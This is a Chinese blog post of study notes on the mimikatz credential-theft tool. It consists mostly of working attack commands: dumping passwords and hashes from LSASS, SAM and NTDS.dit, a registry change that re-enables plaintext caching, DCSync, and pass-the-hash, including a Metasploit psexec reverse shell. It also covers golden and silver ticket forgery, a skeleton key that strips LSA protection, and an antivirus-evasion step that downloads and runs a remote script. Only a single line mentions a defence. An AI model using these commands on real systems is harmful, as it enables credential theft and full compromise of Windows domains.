# mimikatz学习笔记








标准模块：

```bash
standard  - 标准模块 [Basic commands (does not require module name)]
crypto  -  密码模块
sekurlsa  -  sekurlsa模块[枚举凭据的一些命令…]
kerberos  -  kerberos包模块
privilege  -  特权模块
process  -  流程模块
service  -  服务模块
lsadump  -  LsaDump模块
ts  -  终端服务器模块
event  -  事件模块
misc  -  杂项模块
token  -  令牌操作模块
vault  -  Windows保管库/凭据模块
minesweeper  -  扫雷艇模块
net  -
dpapi  -  dpapi模块（通过API或原始访问）[数据保护应用程序编程接口]
busylight  -  busylight模块
sysenv  -  系统环境值模块
sid  -  安全标识符模块
iis  -  IIS XML配置模块
rpc  -  mimikatz的rpc控制
sr98  -  用于sr98设备和T5577目标的射频模块
rdm  - （830 AL）设备的RF模块
acr  -  acr模块
```





### 基础用法：获取windows系统明文密码及HASH

1.提权

由于是要操纵系统内存的，所以需要Debug权限

```bash
privilege::debug

# Mimikatz 需要此权限，因为它要与 LSASS 进程交互。因此，将此权限仅设置为需要这权限的特定用户或组，并将其从本地管理员中删除是非常重要。可以通过将策略定义为不包含任何用户或组来禁用 SeDebugPrivilege。
# Group Policy Management Editor -> Windows Settings -> Security Settings -> Local Policies -> User Rights Assignment -> Debug programs -> Define these policy settings:
```

2.抓取

```
sekurlsa::logonPasswords
```

如果报错，可能是注册表问题，尝试在cmd中输入如下命令（管理员模式）

```
reg add hklm\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential 
```



**原理：**

当用户登陆后,会把账号密码保存在 Isass中，Isass是微软 Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在lsass内存中，经过其 Wdigest和 tspg两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中，而mimikatz正是通过对lsass的逆算获取到明文密码



> 注：但是在安装了KB2871997补丁或者系统版本大于windows server 2012时，系统的内存中就不再保存明文的密码，这样利用mimikatz就不能从内存中读出明文密码了。
>
> mimikatz的使用需要administrator用户执行，administrators中的其他用户都不行。







### 获取系统HASH

#### **本地执行：**

```bash
#提升权限
privilege::debug

#抓取密码
sekurlsa::logonpasswords
```

当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。如下：

cmd修改注册表命令：

```dockerfile
Copyreg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
#重启或用户重新登录后可以成功抓取
```



#### **SAM表获取hash:**

```bash
# 非在线获取，没有将mimikatz传到目标机器上去，就要想办法将这两个文件获取下来（需要管理员权限）
#导出SAM数据
reg save HKLM\SYSTEM SYSTEM
reg save HKLM\SAM SAM

#使用mimikatz提取hash
lsadump::sam /sam:SAM /system:SYSTEM
```







#### **Procdump+Mimikatz：**

当mimikatz无法在主机上运行时，可以使用微软官方发布的工具Procdump导出lsass.exe:

```bash
# 先使用procdump导出文件
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# 再将lsass.dmp下载到本地后，然后执行mimikatz:
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit

# 为了方便复制与查看，还可以输出到本地文件里面：
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" > pssword.txt
```







### 读取域控中域成员Hash

#### 域控本地读取

> 注：得在域控上以域管理员身份执行mimikatz

**方法一：直接执行**

```makefile
#提升权限
privilege::debug

#抓取密码
lsadump::lsa /patch
```



**方法二：**通过 dcsync，利用目录复制服务（DRS）从NTDS.DIT文件中检索密码哈希值，可以在域管权限下执行获取：

```bash
#获取所有域用户
lsadump::dcsync /domain:test.com /all /csv

#指定获取某个用户的hash
lsadump::dcsync /domain:test.com /user:test
```



#### 导出域成员Hash

域账户的用户名和hash密码以域数据库的形式存放在域控制器的 `%SystemRoot%\ntds\NTDS.DIT` 文件中。

这里可以借助：`ntdsutil.exe`，域控制器自带的域数据库管理工具，我们可以通过域数据库，提取出域中所有的域用户信息，在域控上依次执行如下命令，导出域数据库：

```powershell
#创建快照
ntdsutil snapshot "activate instance ntds" create quit quit

#加载快照
ntdsutil snapshot "mount {72ba82f0-5805-4365-a73c-0ccd01f5ed0d}" quit quit

#文件副本
copy C:\$SNAP_201911211122_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit
```

将ntds.dit文件拷贝到本地利用impacket脚本dump出Hash：

```sql
Copysecretsdump.py -ntds.dit -system system.hive LOCAL
```

最后记得卸载删除快照：

```bash
ntdsutil snapshot "unmount {72ba82f0-5805-4365-a73c-0ccd01f5ed0d}" quit quit
ntdsutil snapshot "delete  {72ba82f0-5805-4365-a73c-0ccd01f5ed0d}" quit quit
```



#### secretsdump脚本直接导出域hash

> 可以直接导出，说白了，简单粗暴：

```perl
Copypython secretsdump.py rabbitmask:123456@192.168.15.181
```

首先它会导出本地SAM中的hash，然后是所有域内用户的IP，全部获取成功





### 哈希传递攻击(PTH)

#### 工作组环境

当我们获得了一台主机的NTLM哈希值，我们可以使用mimikatz对其进行哈希传递攻击。执行完命令后，会弹出cmd窗口。

```bash
#使用administrator用户的NTLM哈希值进行攻击
sekurlsa::pth /user:administrator /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9
```

```bash
#使用test用户的NTLM哈希值进行攻击
sekurlsa::pth /user:test /domain:192.168.10.15 /ntlm:329153f560eal81eea55e66a1e8
```

在弹出的cmd窗口，我们直接可以连接该主机，并且查看该主机下的文件夹。

> 注：只能在 mimikatz 弹出的 cmd 窗口才可以执行这些操作，注入成功后，可以使用psexec、wmic、wmiexec等实现远程执行命令。



#### 域环境

在域环境中，当我们获得了域内用户的NTLM哈希值，我们可以使用域内的一台主机用mimikatz对域控进行哈希传递攻击。执行完命令后，会弹出cmd窗口。前提是我们必须拥有域内任意一台主机的本地 administrator 权限和获得了域用户的NTLM哈希值

```bash
#使用域管理员administrator的NTLM哈希值对域控进行哈希传递攻击
sekurlsa::pth /user:administrator /domain:"testyu.com" /ntlm:dbd621b8ed24eb627d32514476fac6c5 
```

```bash
#使用域用户test的NTLM哈希值对域控进行哈希传递攻击
sekurlsa::pth /user:test /domain:"testyu.com" /ntlm:329153f560eb329c0e1deea55e88a1e9   
```



#### MSF进行哈希传递

有些时候，当我们获取到了某台主机的Administrator用户的LM-Hash和 NTLM-Hash ，并且该主机的445端口打开着。我们则可以利用 `exploit/windows/smb/psexec` 漏洞用MSF进行远程登录(哈希传递攻击)。(只能是administrator用户的LM-hash和NTLM-hash)，这个利用跟工作组环境或者域环境无关。

```bash
msf > use  exploit/windows/smb/psexec
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
msf exploit(psexec) > set lhost 192.168.10.27
msf exploit(psexec) > set rhost 192.168.10.14
msf exploit(psexec) > set smbuser Administrator
msf exploit(psexec) > set smbpass 815A3D91F923441FAAD3B435B51404EE:A86D277D2BCD8C8184B01AC21B6985F6   #这里LM和NTLM我们已经获取到了
msf exploit(psexec) > exploit 
```







### 票据传递攻击(PTT)

#### 黄金票据

域中每个用户的 Ticket 都是由 krbtgt 的密码 Hash 来计算生成的，因此只要获取到了 krbtgt 用户的密码 Hash ，就可以随意伪造 Ticket ，进而使用 Ticket 登陆域控制器，使用 krbtgt 用户 hash 生成的票据被称为 Golden Ticket，此类攻击方法被称为票据传递攻击。

首先获取krbtgt的用户hash:

```bash
mimikatz "lsadump::dcsync /domain:xx.com /user:krbtgt"
```

利用 mimikatz 生成域管权限的 Golden Ticket，填入对应的域管理员账号、域名称、sid值，如下：

```bash
kerberos::golden /admin:administrator /domain:ABC.COM /sid:S-1-5-21-3912242732-2617380311-62526969 /krbtgt:c7af5cfc450e645ed4c46daa78fe18da /ticket:test.kiribi
Copy#导入刚才生成的票据
kerberos::ptt test.kiribi

#导入成功后可获取域管权限
dir \\dc.abc.com\c$
```







#### 白银票据

黄金票据和白银票据的一些区别：Golden Ticket：伪造TGT，可以获取任何 Kerberos 服务权限，且由 krbtgt 的 hash 加密，金票在使用的过程需要和域控通信

白银票据：伪造 TGS ，只能访问指定的服务，且由服务账号（通常为计算机账户）的 Hash 加密 ，银票在使用的过程不需要同域控通信

```bash
#在域控上导出 DC$ 的 HASH
mimikatz log "privilege::debug" "sekurlsa::logonpasswords"

#利用 DC$ 的 Hash制作一张 cifs 服务的白银票据
kerberos::golden /domain:ABC.COM /sid: S-1-5-21-3912242732-2617380311-62526969 /target:DC.ABC.COM /rc4:f3a76b2f3e5af8d2808734b8974acba9 /service:cifs /user:strage /ptt

#cifs是指的文件共享服务，有了 cifs 服务权限，就可以访问域控制器的文件系统
dir \\DC.ABC.COM\C$
```



#### skeleton key

skeleton key(万能钥匙)就是给所有域内用户添加一个相同的密码，域内所有的用户 都可以使用这个密码进行认证，同时原始密码也可以使用，其原理是对 lsass.exe 进行注 入，所以重启后会失效。

```php
Copy#在域控上安装 skeleton key
mimikatz.exe privilege::debug "misc::skeleton"

#在域内其他机器尝试使用 skeleton key 去访问域控，添加的密码是 mimikatz
net use \\WIN-9P499QKTLDO.adtest.com\c$ mimikatz /user:adtest\administrator
```

微软在 2014 年 3 月 12 日添加了 LSA 爆护策略，用来防止对进程 lsass.exe 的代码注入。如果直接尝试添加 skelenton key 会失败。

```yaml
Copy#适用系统
windows 8.1
windows server 2012 及以上
```

当然 mimikatz 依旧可以绕过，该功能需要导入mimidrv.sys文件，导入命令如下:

```bash
Copyprivilege::debug
!+
!processprotect /process:lsass.exe /remove 
misc::skeleton
```





#### MS14-068

当我们拿到了一个普通域成员的账号后，想继续对该域进行渗透，拿到域控服务器权限。如果域控服务器存在 MS14_068 漏洞，并且未打补丁，那么我们就可以利用 MS14_068 快速获得域控服务器权限。

MS14-068编号 CVE-2014-6324，补丁为 3011780 ，如果自检可在域控制器上使用命令检测。

```bash
Copysysteminfo |find "3011780"
#为空说明该服务器存在MS14-068漏洞
```





### 导出chrome密码

https://mp.weixin.qq.com/s?__biz=MzIzOTg0NjYzNg==&mid=2247483949&idx=1&sn=db4853c88e4bf0a550c095d9017a363c&chksm=e92297aede551eb815a604ba944c4666b260c5bfe044e1b3a60946b586fd5679e29db0adf18d&mpshare=1&scene=23&srcid=&sharer_sharetime=1582350092849&sharer_shareid=d32981e13d51bf06188894426d2a54e5#rd



也有其他工具



### 免杀

Powersploit中提供的很多工具都是做过加密处理的，同时也提供了一些用来加密处理的脚本，Out-EncryptedScript就是其中之一。

首先在本地对Invoke-Mimikatz.ps1进行加密处理：

```powershell
Copypoweshell.exe Import-Module .\Out-EncryptedScript.ps1
poweshell.exe Out-EncryptedScript -ScriptPath .\Invoke-Mimikatz.ps1 -Password 密码 -Salt 随机数
#默认生成的文件是evil.ps1

-Password   设置加密的密钥
-Salt       随机数，防止被暴力破解
```

将加密生成的evil.sp1脚本放在目标机上，执行如下命令：

```powershell
Copy#远程加载解密脚本
poweshell.exe 
IEX(New-Object Net.WebClient).DownloadString("http://1.1.1.32/PowerSploit/ScriptModification/Out-EncryptedScript.ps1")

[String] $cmd = Get-Content .\evil.ps1
Invoke-Expression $cmd
$decrypted = de password salt
Invoke-Expression $decrypted
Invoke-Mimikatz
```





也可以自己修改mimikatz源码进行免杀。









### 转载&参考

https://www.cnblogs.com/-mo-/p/11890232.html









---

> 作者: [剑胆琴心](http://geoer.cn)  
> URL: https://geoer.cn/mimikatz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/  

